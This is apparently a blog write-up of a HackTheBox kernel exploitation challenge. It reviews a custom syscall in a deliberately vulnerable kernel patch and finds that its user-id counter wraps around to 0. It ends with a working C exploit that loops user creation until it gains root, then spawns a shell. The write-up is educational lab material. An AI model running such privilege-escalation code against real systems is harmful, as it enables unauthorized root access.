---
title: Intro To Kernel Exploitation
description: Learning kernel exploitation via ctf challenges.
date: 2024-04-08 02:45:01-0700
image: https://i.pinimg.com/originals/d8/73/c9/d873c94e242bafe6bbcfa83cde3b8b42.jpg
categories:
    - HackTheBox
tags:
    - pwn
    - htb
    - medium
---

## Setup

WORK IN PROGRESS...

This is the solution for HTB's `Kernel Adventures: Part II`, and in the process, we can learn and get an introduction to kernel exploitation.
We will solve it manually first, then build a fuzzer to locate the vulnerability.
We will learn how to debug at the kernel level.

After you download the challenge, just follow the instructions in the README to get the required version of the linux kernel installed so we can take a look in our code editor.
However, you may get an error during the `git apply` command.
To resolve these, you first need to run `git checkout ff1ffd71d5f0612cf194f5705c671d6b64bf5f91` to revert the repo to the commit in which the vulnerability was introduced.
Now we have the code for the vulnerable kernel, and the author provided the image meant for the challenge.

## Goals

So I will take 2 approaches here.
The first is to do a code review to find the vuln by hand (eyes).
Then I want to build a fuzzer to automate the finding.

## Finding Vulnerability

So my first approach here is to look at the `patch.diff` file to see what was changed.
There was a folder `magic/` that was added.
Also, there is a new syscall `magic` added to `arch/x86/entry/syscalls/syscall_64.tbl`
However, the "meat" of the challenge is in `magic/magic.c`, which fleshes out the syscall.

Lets walkthrough what the new syscall does.
First it will initialize itself via the `do_init()` function, but only if the `initialized` value is not 0.

```c
void do_init() {
    char username[64] = "root";
    char password[64] = "password";
    struct MagicUser* root;

    spin_lock(&magic_lock);
    root = kzalloc(sizeof(struct MagicUser), GFP_KERNEL);
    root->uid.val = 0;
    memcpy(root->username, username, sizeof(username));
    memcpy(root->password, password, sizeof(password));
    root->children = kzalloc(sizeof(struct MagicUser*) * CHILDLIST_SIZE, GFP_KERNEL);
    magic_users[0] = root;
    nextId = 1;
    initialized = 1;
    spin_unlock(&magic_lock);
}
```

This function sets the default username and password to `root:password`.
It also defines a `MagicUser*` called root.
Then `kzalloc` is called and the resulting pointer is assigned to `root`.
From my understanding, `kzalloc` will allocate a chunk and initialize its memory to zero.
An important thing to note here is that this allocation will need to be freed at some point.
Anyways, this function pretty much sets the first user to be root, then creates an allocation for the next user, who will be the child of this root user.

Now lets look at the individual actions we can get this syscall to perform.
Lets start with adding a user with `long do_add(char* username, char* password)`.
First it checks if the user that will be added exists.
This is done by just iterating over the list of users, and checking the username against the supplied username.
Then an empty entry in the user list is found, which is where the new user will be added.
This works similar to the find function, where the user list is iterated over until a null entry is found, and that index is returned.
Then a search for the current user is conducted, but this time by uuid.
Again, this is just a simple for loop that compares uid, nothing special.
Then it will locate an empty slot in the current users child list.
Then another call to `kzalloc` for the new user.
And the next user is given the `nextId` value, which will be +1 from the previous.
We should note, that in no other function is there something to decrement the `nextId` value, meaning it will always increase.
Maybe we could just create new users until we overflow the `uid` value to be 0 again?
Seems possible, cuz `nextId` is an unsigned short (2 bytes), so thats a total of `0xFFFF` values.
Once we obtain that UUID, it would seem that some other values are changed, and then we obtain the privileges of the user with that UUID.
So if we get UUID 0, then we get the privileges of the root user.
Here is my exploit.
After compiling, I gzipped it, then copied it over to the victim machine with base64 encoding.

```c
#include <sys/syscall.h>
#include <stdio.h>
#include <unistd.h>

#define MAGIC_SYS 449

int main() {
    
    long uuid = 1;
    for (int i = 0; i < 0xFFFFFFFF; i++) {
        // Create the user
        uuid = syscall(MAGIC_SYS, 0, "bob", "abc123");
        if (uuid == 0) {
            syscall(MAGIC_SYS, 3, "bob", "abc123");
            char *shell = "/bin/sh";
            char *args[] = {shell, NULL};
            execve(shell, args, NULL);
            return 0;
        }
        // Delete the user
        syscall(MAGIC_SYS, 2, "bob", "abc123");
    }
    return 0;
}
```

```bash
musl-gcc -static -march=x86-64 -Os expl.c -o expl
```